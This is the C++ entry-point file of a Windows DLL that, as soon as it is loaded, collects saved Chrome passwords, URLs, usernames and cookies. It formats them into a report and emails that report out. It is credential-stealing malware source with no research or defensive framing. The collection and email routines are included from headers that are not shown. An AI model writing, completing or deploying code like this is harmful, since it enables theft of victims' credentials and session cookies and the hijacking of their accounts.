// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <fstream>
#include "includes/ChromePasswordCollecter.h"
#include "includes/ChromeCookiesCollecter.h"

#include "includes/SendEmail.h"


void gather_result(const std::vector<userData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{

		account_info += "Url: " + data.url  + "\nUsername: " + data.username + "\nPassword: " + data.password + "\n";
		account_info += "--------------------------------------------------------------------------------\n" ;
	}
}

void gather_result(const std::vector<CookieData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{
		account_info += "HostKey: " + data.hostKey + "\nname: " + data.name + "\nValue:: "+ data.value +"\nPath: " + data.path + "\nExpireUTC: " + data.expireUTC + "\n";
		account_info += "--------------------------------------------------------------------------------\n";
	
	}

}


void getInfo() {
	std::string account_info("Password information :\n");
	ChromePasswordCollecter passwordsCollecter;
	gather_result(passwordsCollecter.collectData(), account_info);

	account_info += "Cookies information :\n";
	ChromeCookiesCollecter cookieCollecter;
	gather_result(cookieCollecter.collectData(), account_info);

	sendEmail("account information", account_info);

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		getInfo();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

